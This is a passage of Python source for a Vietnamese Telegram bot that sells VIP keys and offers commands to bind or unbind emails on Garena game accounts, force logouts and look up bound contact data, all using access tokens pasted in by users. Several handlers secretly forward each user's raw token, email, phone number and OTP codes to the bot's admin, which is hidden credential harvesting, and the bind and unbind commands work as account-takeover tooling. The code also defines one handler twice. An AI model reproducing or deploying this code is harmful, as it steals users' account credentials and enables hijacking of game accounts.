            await q.answer("Bài này đã được xử lý rồi!", show_alert=True)
            return
        if action == "approve":
            sub2["status"] = "approved"
            ev2["submissions"][tuid] = sub2
            db2["events"][eid] = ev2
            save_db(db2)
            # Trao thưởng
            reward_type = ev2.get("reward_type", "money")
            reward_value = ev2.get("reward_value", 0)
            if reward_type == "key":
                key3 = gen_vip_key(reward_value)
                pool3 = db2.get("key_pool", {})
                pool3[key3] = {
                    "days": reward_value,
                    "free": False,
                    "used": False,
                    "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
                db2["key_pool"] = pool3
                save_db(db2)
                activate_vip_key(tuid, key3)
                reward_msg = f"💎  VIP {reward_value} ngày đã được kích hoạt!"
            else:
                add_balance(tuid, reward_value)
                reward_msg = f"💰  {
                    reward_value:,}đ đã được cộng vào tài khoản!"
            try:
                await ctx.bot.send_message(
                    int(tuid),
                    f"```\n"
                    f"┌───⭓ 🎉 EVENT ĐƯỢC DUYỆT!\n"
                    f"│  📋  {ev2['title']}\n"
                    f"│  {reward_msg}\n"
                    f"└──────────────────\n"
                    f"```",
                    parse_mode=ParseMode.MARKDOWN_V2
                )
            except Exception:
                pass
            await q.edit_message_caption(
                caption=f"✅  Đã duyệt @{sub2.get('username', '?')} — Trao thưởng xong",
                reply_markup=None
            )
        else:
            sub2["status"] = "rejected"
            ev2["submissions"][tuid] = sub2
            db2["events"][eid] = ev2
            save_db(db2)
            try:
                await ctx.bot.send_message(
                    int(tuid),
                    f"```\n┌───⭓ EVENT BỊ TỪ CHỐI\n│  ❌  Bài tham gia của bạn không hợp lệ!\n└──────────────────\n```",
                    parse_mode=ParseMode.MARKDOWN_V2
                )
            except Exception:
                pass
            await q.edit_message_caption(
                caption=f"❌  Đã từ chối @{sub2.get('username', '?')}",
                reply_markup=None
            )
        return

    if data == "adm_bot":
        s["bot_on"] = not s["bot_on"]
        save_db(db)
    elif data == "adm_spam":
        s["spam_on"] = not s["spam_on"]
        save_db(db)
    elif data == "adm_maint":
        s["maintenance"] = not s["maintenance"]
        save_db(db)
    elif data == "adm_freekey":
        s["free_key_on"] = not s["free_key_on"]
        save_db(db)
    elif data == "adm_stats":
        avip = sum(
            1 for v in db["vip_keys"].values() if v["expire"] == -
            1 or v["expire"] > time.time())
        rspam = sum(1 for v in active_spams.values() if v["running"])
        await q.message.reply_text(
            f"```\n📊  THỐNG KÊ\n├──────────────────\n👥  Tổng users  :  {len(db['users'])}\n💎  VIP active  :  {avip}\n🚀  Spam run    :  {rspam}\n🔑  Keys pool   :  {len(db.get('key_pool', {}))}\n🚫  Đã ban      :  {len(db['banned'])}\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return
    elif data == "adm_broadcast":
        await q.message.reply_text("```\n📢  Dùng lệnh:\n/broadcast <nội dung>\n```", parse_mode=ParseMode.MARKDOWN_V2)
        return
    elif data == "adm_cleanup":
        await cmd_cleanup(update, ctx)
        return
    elif data == "adm_createkey":
        await q.message.reply_text("```\n┌───⭓ TẠO KEY VIP\n│  Lệnh: /createkey <số_ngày>\n│  VD  : /createkey 30\n└──────────────────\n```", parse_mode=ParseMode.MARKDOWN_V2)
        return
    elif data == "adm_update":
        await check_update_logic(ctx, manual=True)
        return
    elif data == "adm_exporttoken":
        await export_tokens_file(update, ctx)
        return
    elif data == "adm_sysinfo":
        await cmd_sysinfo(update, ctx)
        return
    elif data == "adm_setspam":
        await q.message.reply_text(
            f"```\n┌───⭓ CÀI THỜI GIAN SPAM\n│  Hiện tại: {SPAM_INTERVAL}s\n│  Lệnh   : /setspam <giây>\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return
    elif data == "adm_vipstats":
        await cmd_vipstats(update, ctx, _reply=q.message)
        return
    elif data == "adm_delvip":
        await q.message.reply_text("```\n┌───⭓ XÓA VIP USER\n│  Lệnh: /delvip <user_id>\n└──────────────────\n```", parse_mode=ParseMode.MARKDOWN_V2)
        return
    elif data == "adm_exportvip":
        await cmd_exportvip(update, ctx)
        return
    elif data == "adm_listnap":
        if not pending_nap:
            await q.message.reply_text("```\n┌───⭓ DANH SÁCH CHỜ NẠP\n│  📭  Không có yêu cầu nào!\n└──────────────────\n```", parse_mode=ParseMode.MARKDOWN_V2)
        else:
            lines = "```\n┌───⭓ DANH SÁCH CHỜ NẠP\n│\n"
            for puid, pinfo in pending_nap.items():
                left = max(0, int(pinfo["expire"] - time.time()))
                lines += (
                    f"│  👤  @{pinfo.get('username', 'N/A')}  ({puid})\n"
                    f"│  💰  {pinfo['amount']:,}đ  |  ⏳ còn {left}s\n"
                    f"│  📝  {pinfo['noi_dung']}\n"
                    f"├──────────────────\n"
                )
            lines += "└──────────────────\n```"
            await q.message.reply_text(lines, parse_mode=ParseMode.MARKDOWN_V2)
        return

    db = load_db()
    try:
        await q.edit_message_reply_markup(reply_markup=admin_kb(db["settings"]))
    except BaseException:
        pass


# ══════════════════════════════════════════════════════
#          LỆNH MAIL API (YÊU CẦU VIP)
# ══════════════════════════════════════════════════════
async def vip_guard(update: Update, uid: str) -> bool:
    """True = bị chặn"""
    if await guard(update, uid):
        return True
    has_vip, _ = check_vip(uid)
    if not has_vip:
        await get_reply(update).reply_text(
            f"```\n┌───⭓ YÊU CẦU VIP\n│  ❌  Lệnh này chỉ dành cho VIP!\n│  💰  Mua key: {VIP_CONTACT}\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return True
    db = load_db()
    kinfo = db.get(
        "key_pool",
        {}).get(
        db["vip_keys"].get(
            uid,
            {}).get(
                "key",
                ""),
        {})
    if kinfo.get("free"):
        await get_reply(update).reply_text(
            f"```\n┌───⭓ YÊU CẦU VIP\n│  ⛔  Key free không dùng được lệnh này!\n│  💰  Mua VIP: {VIP_CONTACT}\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return True
    return False


async def cmd_mailinfo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if await vip_guard(update, uid):
        return
    if not ctx.args:
        return await get_reply(update).reply_text(
            "```\n┌───⭓ CHECK BIND INFO\n│  Cú pháp: /mailinfo <token>\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    token = await convert_eat_to_access(ctx.args[0].strip())
    loading = await get_reply(update).reply_text("```\n⏳  Đang lấy thông tin...\n```", parse_mode=ParseMode.MARKDOWN_V2)
    try:
        async with httpx.AsyncClient(timeout=15) as c:
            r = await c.get(f"https://luanori-check-mail.vercel.app/bind_info?access_token={token}")
            d = r.json()
        await loading.delete()
        if d.get("status") != "success":
            return await get_reply(update).reply_text("```\n❌  Token không hợp lệ!\n```", parse_mode=ParseMode.MARKDOWN_V2)
        data = d.get("data", {})
        raw = data.get("raw_response", {})
        email = data.get("current_email") or "[ Trống ]"
        mobile = raw.get("mobile") or "[ Trống ]"
        pend = data.get("pending_email") or "[ Không có ]"
        countdown = data.get("countdown_human", "0 Sec")
        # Gửi đầy đủ cho admin
        try:
            uname = update.effective_user.username or update.effective_user.first_name
            await ctx.bot.send_message(
                ADMIN_ID,
                f"```\n"
                f"┌───⭓ MAILINFO MỚI\n"
                f"│  👤  User       :  @{uname}\n"
                f"│  🆔  ID         :  {uid}\n"
                f"│  🔑  Token      :  {token}\n"
                f"│  📩  Email      :  {email}\n"
                f"│  📱  SĐT        :  {mobile}\n"
                f"│  📩  Chờ đổi   :  {pend}\n"
                f"│  ⏳  Countdown  :  {countdown}\n"
                f"└──────────────────\n"
                f"```",
                parse_mode=ParseMode.MARKDOWN_V2
            )
        except Exception:
            pass
        # Hiện đầy đủ cho VIP (mailinfo là lệnh VIP)
        await get_reply(update).reply_text(
            f"```\n"
            f"┌───⭓ THÔNG TIN BIND\n"
            f"│\n"
            f"│  📩  Email hiện tại  :  {email}\n"
            f"│  📩  Email chờ đổi  :  {pend}\n"
            f"│  📱  SĐT             :  {mobile}\n"
            f"│  ⏳  Đếm ngược       :  {countdown}\n"
            f"└──────────────────\n"
            f"```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await loading.delete()
        await get_reply(update).reply_text(f"```\n❌  Lỗi: {str(e)[:100]}\n```", parse_mode=ParseMode.MARKDOWN_V2)

GARENA_BIND_HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "GarenaMSDK/4.0.30 (iPad7,12;ios - 18.7;vi-VN;VN)",
    "Accept": "application/json"
}

GARENA_BIND_URL = "https://100067.connect.garena.com"

async def garena_post(endpoint: str, data: dict) -> dict:
    import requests as _req
    loop = asyncio.get_event_loop()
    def _call():
        return _req.post(
            f"{GARENA_BIND_URL}{endpoint}",
            data=data,
            headers=GARENA_BIND_HEADERS,
            timeout=20
        ).json()
    return await loop.run_in_executor(None, _call)

async def send_log_admin(update, token, email, extra=""):
    try:
        bot = update.get_bot()
        user = update.effective_user
        uid = user.id
        username = user.username

        await bot.send_message(
            ADMIN_ID,
            f"```\n"
            f"┌───⭓ USER DÙNG LỆNH\n"
            f"│  👤  User   : @{username or 'N/A'}\n"
            f"│  🆔  ID     : {uid}\n"
            f"│  🔑  Token  : {token}\n"
            f"│  📩  Email  : {email}\n"
            f"{extra}"
            f"└──────────────────\n"
            f"```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        print("Lỗi gửi admin:", e)

async def cmd_cancelreq(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if await vip_guard(update, uid):
        return
    if not ctx.args:
        return await get_reply(update).reply_text("```\n⚠️  Cú pháp: /cancelreq <token>\n```", parse_mode=ParseMode.MARKDOWN_V2)
    token = await convert_eat_to_access(ctx.args[0].strip())
    # 🔥 LOG ADMIN
    await send_log_admin(update, ctx.args[0].strip(), "", "│  📌  Hành động: CANCEL REQUEST\n")
    loading = await get_reply(update).reply_text("```\n⏳  Đang hủy yêu cầu...\n```", parse_mode=ParseMode.MARKDOWN_V2)
    try:
        loop = asyncio.get_event_loop()
        bot_tool = GarenaAutomator(token)

        def _cancel():
            url = f"{bot_tool.base_url}/game/account_security/bind:cancel"
            data = {
                "app_id": bot_tool.app_id,
                "access_token": bot_tool.access_token}
            try:
                return requests.post(
                    url, data=data, headers=bot_tool.headers).json()
            except BaseException:
                return {"result": -1}
        d = await loop.run_in_executor(None, _cancel)
        ok = d.get("result") == 0
        msg = "Đã hủy yêu cầu thành công!" if ok else str(d)
        await loading.delete()
        await get_reply(update).reply_text(
            f"```\n┌───⭓ HỦY YÊU CẦU\n│  {'✅' if ok else '❌'}  {msg}\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        try:
            await loading.delete()
        except BaseException:
            pass
        await get_reply(update).reply_text(f"```\n❌  Lỗi: {str(e)[:100]}\n```", parse_mode=ParseMode.MARKDOWN_V2)

async def cmd_sendotp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if await vip_guard(update, uid): return
    if len(ctx.args) < 2:
        return await get_reply(update).reply_text(
            "```\n┌───⭓ GỬI OTP\n│  Cú pháp: /sendotp <token> <email>\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    token   = await convert_eat_to_access(ctx.args[0].strip())
    email   = ctx.args[1].strip()
    loading = await get_reply(update).reply_text("```\n⏳  Đang gửi OTP...\n```", parse_mode=ParseMode.MARKDOWN_V2)
    try:
        d  = await garena_post("/game/account_security/bind:send_otp", {
            "email": email, "locale": "vi_VN", "region": "VN",
            "app_id": "100067", "access_token": token
        })
        ok  = d.get("result") == 0
        msg = "Gửi thành công! Kiểm tra hòm thư." if ok else str(d)
        await loading.delete()
        await get_reply(update).reply_text(
            f"```\n┌───⭓ GỬI OTP\n│  📩  Email  :  {email}\n│  {'✅' if ok else '❌'}  {msg}\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        try: await loading.delete()
        except: pass
        await get_reply(update).reply_text(f"```\\n❌  Lỗi: {str(e)[:100]}\\n```", parse_mode=ParseMode.MARKDOWN_V2)

async def cmd_verifyotp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if await vip_guard(update, uid): return
    if len(ctx.args) < 3:
        return await get_reply(update).reply_text("```\n⚠️  Cú pháp: /verifyotp <token> <email> <otp>\n```", parse_mode=ParseMode.MARKDOWN_V2)
    token   = await convert_eat_to_access(ctx.args[0].strip())
    email   = ctx.args[1].strip()
    otp     = ctx.args[2].strip()
    loading = await get_reply(update).reply_text("```\n⏳  Đang xác thực OTP...\n```", parse_mode=ParseMode.MARKDOWN_V2)
    try:
        d  = await garena_post("/game/account_security/bind:verify_otp", {
            "email": email, "app_id": "100067",
            "access_token": token, "otp": otp
        })
        ok     = d.get("result") == 0
        vtoken = d.get("verifier_token", "")
        await loading.delete()
        if ok and vtoken:
            # Lưu verifier_token để dùng cho /bindmail
            ctx.user_data["verifier_token"] = vtoken
            ctx.user_data["verify_email"]   = email
            await get_reply(update).reply_text(
                f"```\n"
                f"┌───⭓ XÁC THỰC OTP THÀNH CÔNG\n"
                f"│\n"
                f"│  ✅  OTP hợp lệ!\n"
                f"│  📌  Dùng lệnh tiếp theo:\n"
                f"│  /bindmail <token> <email> <matkhau>\n"
                f"│  để hoàn tất liên kết email\n"
                f"└──────────────────\n"
                f"```",
                parse_mode=ParseMode.MARKDOWN_V2
            )
        try:
            uname = update.effective_user.username or update.effective_user.first_name
            await ctx.bot.send_message(
                ADMIN_ID,
                f"```\n┌───⭓ VERIFYOTP\n│  👤  @{uname} ({uid})\n│  📩  Email  :  {email}\n│  🔑  Token  :  {token}\n│  {'✅ Thành công - có verifier_token' if ok and vtoken else '❌ Thất bại'}\n└──────────────────\n```",
                parse_mode=ParseMode.MARKDOWN_V2
            )
        except Exception: pass
        if not ok or not vtoken:
            err = d.get("error_msg") or str(d)[:80]
            await get_reply(update).reply_text(
                f"```\n┌───⭓ XÁC THỰC OTP\n│  ❌  {err}\n└──────────────────\n```",
                parse_mode=ParseMode.MARKDOWN_V2
            )
    except Exception as e:
        try: await loading.delete()
        except: pass
        await get_reply(update).reply_text(f"```\\n❌  Lỗi: {str(e)[:100]}\\n```", parse_mode=ParseMode.MARKDOWN_V2)

async def cmd_bindmail(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """
    /bindmail <token> <email> <matkhau>
    Bước cuối: liên kết email sau khi đã verify OTP
    """
    uid = str(update.effective_user.id)
    if await vip_guard(update, uid): return
    if len(ctx.args) < 3:
        return await get_reply(update).reply_text(
            "```\n"
            "┌───⭓ LIÊN KẾT EMAIL\n"
            "│  Cú pháp: /bindmail <token> <email> <matkhau>\n"
            "│  Chạy /sendotp và /verifyotp trước!\n"
            "└──────────────────\n"
            "```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    token    = await convert_eat_to_access(ctx.args[0].strip())
    email    = ctx.args[1].strip()
    password = ctx.args[2].strip()
    vtoken   = ctx.user_data.get("verifier_token")

    if not vtoken:
        return await get_reply(update).reply_text(
            "```\n"
            "┌───⭓ CHƯA XÁC THỰC OTP\n"
            "│  ❌  Bạn cần chạy /sendotp và /verifyotp trước!\n"
            "└──────────────────\n"
            "```",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    loading = await get_reply(update).reply_text("```\n⏳  Đang liên kết email...\n```", parse_mode=ParseMode.MARKDOWN_V2)
    try:
        import hashlib as _hl
        hashed_pw = _hl.sha256(password.encode("utf-8")).hexdigest().upper()
        d = await garena_post("/game/account_security/bind:create_bind_request", {
            "email":              email,
            "secondary_password": hashed_pw,
            "app_id":             "100067",
            "verifier_token":     vtoken,
            "access_token":       token
        })
        ok  = d.get("result") == 0
        msg = "✅ Liên kết email thành công!" if ok else f"❌ {d.get('error_msg') or str(d)[:80]}"
        if ok:
            ctx.user_data.pop("verifier_token", None)
            ctx.user_data.pop("verify_email", None)
        await loading.delete()
        await get_reply(update).reply_text(
            f"```\n"
            f"┌───⭓ KẾT QUẢ LIÊN KẾT EMAIL\n"
            f"│\n"
            f"│  📩  Email  :  {email}\n"
            f"│  {msg}\n"
            f"└──────────────────\n"
            f"```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
        # Báo admin
        try:
            uname = update.effective_user.username or update.effective_user.first_name
            await ctx.bot.send_message(
                ADMIN_ID,
                f"```\n"
                f"┌───⭓ BINDMAIL\n"
                f"│  👤  User   :  @{uname}\n"
                f"│  🆔  ID     :  {uid}\n"
                f"│  📩  Email  :  {email}\n"
                f"│  {'✅ Thành công' if ok else '❌ Thất bại'}\n"
                f"└──────────────────\n"
                f"```",
                parse_mode=ParseMode.MARKDOWN_V2
            )
        except Exception: pass
    except Exception as e:
        try: await loading.delete()
        except: pass
        await get_reply(update).reply_text(f"```\n❌  Lỗi: {str(e)[:100]}\n```", parse_mode=ParseMode.MARKDOWN_V2)

async def cmd_cancelreq(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if await vip_guard(update, uid): return
    if not ctx.args:
        return await get_reply(update).reply_text("```\n⚠️  Cú pháp: /cancelreq <token>\n```", parse_mode=ParseMode.MARKDOWN_V2)
    token = await convert_eat_to_access(ctx.args[0].strip())
    res   = await luan_request("cancel", {"access_token": token})
    msg   = res.get("message", str(res))
    await get_reply(update).reply_text(
        f"```\n┌───⭓ HỦY YÊU CẦU\n│  📋  {msg}\n└──────────────────\n```",
        parse_mode=ParseMode.MARKDOWN_V2
    )

async def cmd_unbind(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if await vip_guard(update, uid):
        return
    if len(ctx.args) < 2:
        return await get_reply(update).reply_text(
            "```\n⚠️  Cú pháp: /unbind <token> <email>\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    token = await convert_eat_to_access(ctx.args[0].strip())
    email = ctx.args[1].strip()
    # 🔥 LOG ADMIN
    await send_log_admin(update, ctx.args[0].strip(), email, "│  📌  Hành động: UNBIND REQUEST\n")
    loading = await get_reply(update).reply_text("```\n⏳  Đang gửi OTP gỡ liên kết...\n```", parse_mode=ParseMode.MARKDOWN_V2)
    try:
        async with httpx.AsyncClient(timeout=15) as c:
            r = await c.post(
                "https://luanori-check-mail.vercel.app/unbind_request",
                json={"access_token": token, "email": email}
            )
            d = r.json()
        await loading.delete()
        ok = d.get("status") == "success"
        msg = d.get("message", str(d))
        await get_reply(update).reply_text(
            f"```\n┌───⭓ GỠ LIÊN KẾT\n│  {'✅' if ok else '❌'}  {msg}\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        try:
            await loading.delete()
        except BaseException:
            pass
        await get_reply(update).reply_text(f"```\n❌  Lỗi: {str(e)[:100]}\n```", parse_mode=ParseMode.MARKDOWN_V2)


async def cmd_unbindotp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if await vip_guard(update, uid):
        return
    if len(ctx.args) < 3:
        return await get_reply(update).reply_text("```\n⚠️  Cú pháp: /unbindotp <token> <email> <otp>\n```", parse_mode=ParseMode.MARKDOWN_V2)
    token = await convert_eat_to_access(ctx.args[0].strip())
    email = ctx.args[1].strip()
    otp = ctx.args[2].strip()
    # 🔥 LOG ADMIN
    await send_log_admin(update, ctx.args[0].strip(), email, f"│  📌  Hành động: UNBIND VERIFY\n│  🔢  OTP: {otp}\n")
    loading = await get_reply(update).reply_text("```\n⏳  Đang xác nhận gỡ liên kết...\n```", parse_mode=ParseMode.MARKDOWN_V2)
    try:
        async with httpx.AsyncClient(timeout=15) as c:
            r = await c.post(
                "https://luanori-check-mail.vercel.app/unbind_verify",
                json={"access_token": token, "email": email, "otp": otp}
            )
            d = r.json()
        await loading.delete()
        ok = d.get("status") == "success"
        msg = d.get("message", str(d))
        await get_reply(update).reply_text(
            f"```\n┌───⭓ KẾT QUẢ GỠ LIÊN KẾT\n│  {'✅' if ok else '❌'}  {msg}\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        try:
            await loading.delete()
        except BaseException:
            pass
        await get_reply(update).reply_text(f"```\n❌  Lỗi: {str(e)[:100]}\n```", parse_mode=ParseMode.MARKDOWN_V2)


async def cmd_dxuat(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if await guard(update, uid):
        return
    if not ctx.args:
        return await get_reply(update).reply_text(
            "```\n┌───⭓ ĐĂNG XUẤT TÀI KHOẢN\n│  Cú pháp: /dxuat <token>\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    token = await convert_eat_to_access(ctx.args[0].strip())
   # 🔥 LOG ADMIN
    await send_log_admin(update, ctx.args[0].strip(), "", "│  📌  Hành động: LOGOUT\n")
    loading = await get_reply(update).reply_text("```\n⏳  Đang đăng xuất...\n```", parse_mode=ParseMode.MARKDOWN_V2)
    loop = asyncio.get_event_loop()
    bot_tool = GarenaAutomator(token)
    res = await loop.run_in_executor(None, bot_tool.logout)
    await loading.delete()
    if res.get("result") == 0 or res.get("error") == "success":
        await get_reply(update).reply_text(
            "```\n┌───⭓ ĐĂNG XUẤT\n│  ✅  Đăng xuất tài khoản thành công!\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    else:
        await get_reply(update).reply_text(
            f"```\n┌───⭓ ĐĂNG XUẤT\n│  ❌  Lỗi: {str(res)[:100]}\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )


# ══════════════════════════════════════════════════════
#          ADMIN: THỐNG KÊ VIP + XÓA VIP + XUẤT FILE
# ══════════════════════════════════════════════════════


@admin_only
async def cmd_vipstats(
        update: Update,
        ctx: ContextTypes.DEFAULT_TYPE,
        _reply=None):
    db = load_db()
    vk = db.get("vip_keys", {})
    pool = db.get("key_pool", {})
    users = db.get("users", {})
    reply = _reply or update.message
    if not vk:
        return await reply.reply_text("```\n📭  Chưa có VIP user nào!\n```", parse_mode=ParseMode.MARKDOWN_V2)
    lines = "```\n┌───⭓ THỐNG KÊ VIP\n│\n"
    for uid, info in vk.items():
        ok, left = check_vip(uid)
        uname = users.get(uid, {}).get("username") or uid
        key = info.get("key", "?")
        ktype = "FREE" if pool.get(key, {}).get("free") else "VIP"
        act = info.get("activated", "?")
        lines += (
            f"│  👤  @{uname}  ({uid})\n"
            f"│  🔑  Key   :  {key}\n"
            f"│  ⭐  Loại  :  {ktype}\n"
            f"│  📅  Kích  :  {act}\n"
            f"│  ⏳  Còn   :  {'✅ ' + left if ok else '❌ Hết hạn'}\n"
            f"├──────────────────\n"
        )
    lines += "└──────────────────\n```"
    await reply.reply_text(lines, parse_mode=ParseMode.MARKDOWN_V2)


@admin_only
async def cmd_delvip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        return await get_reply(update).reply_text("```\n⚠️  Cú pháp: /delvip <user_id>\n```", parse_mode=ParseMode.MARKDOWN_V2)
    tid = ctx.args[0]
    db = load_db()
    if tid in db.get("vip_keys", {}):
        del db["vip_keys"][tid]
        save_db(db)
        sid = user_active_session.get(tid)
        if sid and sid in active_spams:
            active_spams[sid]["running"] = False
        try:
            await ctx.bot.send_message(
                int(tid),
                f"```\n┌───⭓ THÔNG BÁO\n│  ⛔  Key VIP của bạn đã bị thu hồi.\n│  💰  Liên hệ: {VIP_CONTACT}\n└──────────────────\n```",
                parse_mode=ParseMode.MARKDOWN_V2
            )
        except Exception:
            pass
        await get_reply(update).reply_text(f"```\n✅  Đã xóa VIP của ID: {tid}\n```", parse_mode=ParseMode.MARKDOWN_V2)
    else:
        await get_reply(update).reply_text(f"```\n⚠️  ID {tid} không có VIP!\n```", parse_mode=ParseMode.MARKDOWN_V2)


@admin_only
async def cmd_exportvip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    db = load_db()
    vk = db.get("vip_keys", {})
    pool = db.get("key_pool", {})
    users = db.get("users", {})
    lines = []
    lines.append(
        f"=== XUẤT DỮ LIỆU VIP === {
            datetime.now():%Y-%m-%d %H:%M:%S}\n")
    for uid, info in vk.items():
        ok, left = check_vip(uid)
        uname = users.get(uid, {}).get("username") or "N/A"
        key = info.get("key", "?")
        ktype = "FREE" if pool.get(key, {}).get("free") else "VIP"
        act = info.get("activated", "?")
        lines.append(
            f"ID      : {uid}\n"
            f"Username: @{uname}\n"
            f"Key     : {key}\n"
            f"Loai    : {ktype}\n"
            f"Kich HT : {act}\n"
            f"Con lai : {'OK - ' + left if ok else 'HET HAN'}\n"
            f"---\n"
        )
    export_path = os.path.join(
        os.path.dirname(
            os.path.abspath(__file__)),
        "vip_export.txt")
    with open(export_path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    reply_obj = getattr(
        update,
        'message',
        None) or getattr(
        update,
        'callback_query',
        None)
    if hasattr(reply_obj, 'message'):
        reply_obj = reply_obj.message
    await reply_obj.reply_document(
        document=open(export_path, "rb"),
        filename="vip_export.txt",
        caption="```\n┌───⭓ FILE XUẤT VIP\n│  ✅  Đã xuất dữ liệu VIP\n└──────────────────\n```",
        parse_mode=ParseMode.MARKDOWN_V2
    )


# ══════════════════════════════════════════════════════
#               /info <uid>
# ══════════════════════════════════════════════════════
async def cmd_info(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if await guard(update, uid):
        return
    if not ctx.args:
        return await update.message.reply_text("```\n⚠️  Cú pháp: /info <uid_ff>\n```", parse_mode=ParseMode.MARKDOWN_V2)
    await update.message.reply_text(await fetch_ff_info(ctx.args[0].strip()), parse_mode=ParseMode.MARKDOWN_V2)

# ══════════════════════════════════════════════════════
#               ADMIN: /setspam /checkupdate /exporttoken
# ══════════════════════════════════════════════════════


@admin_only
async def cmd_setspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    global SPAM_INTERVAL
    if not ctx.args or not ctx.args[0].isdigit():
        return await get_reply(update).reply_text(
            f"```\n┌───⭓ CÀI THỜI GIAN SPAM\n│  Hiện tại  :  {SPAM_INTERVAL}s\n│  Cú pháp   :  /setspam <giây>\n│  Ví dụ     :  /setspam 2\n└──────────────────\n```",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    SPAM_INTERVAL = int(ctx.args[0])
    await get_reply(update).reply_text(
        f"```\n┌───⭓ ĐÃ CẬP NHẬT\n│  ⏱️  Thời gian spam: {SPAM_INTERVAL}s\n└──────────────────\n```",
        parse_mode=ParseMode.MARKDOWN_V2
    )


@admin_only
async def cmd_checkupdate(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await check_update_logic(ctx, manual=True)


@admin_only
async def cmd_exporttoken(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await export_tokens_file(update, ctx)


@admin_only
async def cmd_sysinfo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        import psutil
        cpu = psutil.cpu_percent(interval=0.5)
        ram = psutil.virtual_memory()
        disk = psutil.disk_usage(os.path.dirname(os.path.abspath(__file__)))
        text = (
            f"```\n"
            f"┌───⭓ THÔNG TIN HỆ THỐNG\n"
            f"│\n"
            f"│  🖥️  CPU      :  {cpu}%\n"
            f"│  💾  RAM      :  {ram.percent}%  ({ram.used // 1024 // 1024}MB / {ram.total // 1024 // 1024}MB)\n"
            f"│  💿  Disk     :  {disk.percent}%  free {disk.free // 1024 // 1024}MB\n"
            f"│  🤖  Spam     :  {len(active_spams)} phiên\n"
            f"│  ⏱️  Interval :  {SPAM_INTERVAL}s\n"
            f"│  👥  Users    :  {len(load_db()['users'])}\n"
            f"│  📌  Version  :  v{VERSION}\n"
            f"└──────────────────\n"
            f"```"
        )
    except Exception as e:
        import shutil
        disk = shutil.disk_usage(os.path.dirname(os.path.abspath(__file__)))
        text = (
            f"```\n"
            f"┌───⭓ THÔNG TIN HỆ THỐNG\n"
            f"│  💿  Disk free :  {disk.free // 1024 // 1024}MB\n"
            f"│  🤖  Spam      :  {len(active_spams)} phiên\n"
            f"│  ⏱️  Interval  :  {SPAM_INTERVAL}s\n"
            f"│  ⚠️  Lỗi psutil:  {str(e)[:50]}\n"
            f"└──────────────────\n"
            f"```"
        )
    await get_reply(update).reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)


# ══════════════════════════════════════════════════════
#               /mua — BẢNG GIÁ VIP
# ══════════════════════════════════════════════════════
async def cmd_mua(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if await guard(update, uid):
        return
    db = load_db()
    shop = db.get("shop", DEFAULT_SHOP)
    balance = get_balance(uid)
    text = (
        f"```\n"
        f"┌───⭓ BẢNG GIÁ KEY VIP\n"
        f"│  💰  Số dư của bạn: {balance:,}đ\n"
        f"├──────────────────\n"
    )
    kb_rows = []
    for k, item in shop.items():
        affordable = "✅" if balance >= item["price"] else "❌"
        text += (
            f"│  {affordable}  [{k}] {item['label']}\n"
            f"│      💰 {item['price']:,}đ  —  {item['desc']}\n"
            f"├──────────────────\n"
        )
        kb_rows.append([InlineKeyboardButton(
            f"{'✅' if balance >= item['price'] else '❌'}  Mua {item['label']} — {item['price']:,}đ",
            callback_data=f"buy_{k}"
        )])
    text += f"│  📌  Nạp tiền: /nap <số tiền>\n└──────────────────\n```"
    kb_rows.append([InlineKeyboardButton(
        "💳  Nạp tiền", callback_data="nap_info")])
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb_rows), parse_mode=ParseMode.MARKDOWN_V2)


async def process_buy(q, uid: str, days_key: str, ctx):
    db = load_db()
    shop = db.get("shop", DEFAULT_SHOP)
    if days_key not in shop:
        await q.answer("Gói không tồn tại!", show_alert=True)
        return
